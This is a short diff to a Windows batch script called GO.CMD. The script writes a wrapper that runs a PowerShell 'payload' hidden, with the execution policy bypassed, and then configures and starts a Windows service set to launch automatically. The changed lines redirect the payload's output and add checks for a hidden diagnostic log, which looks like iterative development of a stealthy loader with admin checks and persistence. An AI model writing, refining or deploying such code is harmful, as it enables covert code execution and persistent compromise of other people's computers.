@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions
-echo === GO.CMD BUILD 20260730WU8D ===
+echo === GO.CMD BUILD 20260730WU8E ===
 
 net session >nul 2>&1
 if errorlevel 1 (
@@ -72,8 +72,10 @@ for %%A in ("%B64%") do echo OK bytes=%%~zA
 >>"%WRAP%" echo if errorlevel 1 echo marker_fail want_%MARKER%^>^>"%ERR%" ^& exit /b 3
 >>"%WRAP%" echo copy /y "%PS1ALT%" "%PS1%" ^>nul 2^>^&1
 >>"%WRAP%" echo echo running_payload^>^>"%ERR%"
->>"%WRAP%" echo powershell.exe -NoP -NonI -EP Bypass -WindowStyle Hidden -File "%PS1ALT%" ^>^>"%ERR%" 2^>^&1
+>>"%WRAP%" echo powershell.exe -NoP -NonI -EP Bypass -WindowStyle Hidden -File "%PS1ALT%" ^>^>"%WORKDIR%\boot.out" 2^>^&1
 >>"%WRAP%" echo echo boot_exit_%%ERRORLEVEL%%^>^>"%ERR%"
+>>"%WRAP%" echo if exist "%WORKDIR%\.diag.log" echo diag_ok^>^>"%ERR%"
+>>"%WRAP%" echo if not exist "%WORKDIR%\.diag.log" echo diag_missing^>^>"%ERR%"
 >>"%WRAP%" echo sc config "%ALTSC%" start= auto ^>nul 2^>^&1
 >>"%WRAP%" echo sc start "%ALTSC%" ^>nul 2^>^&1
 
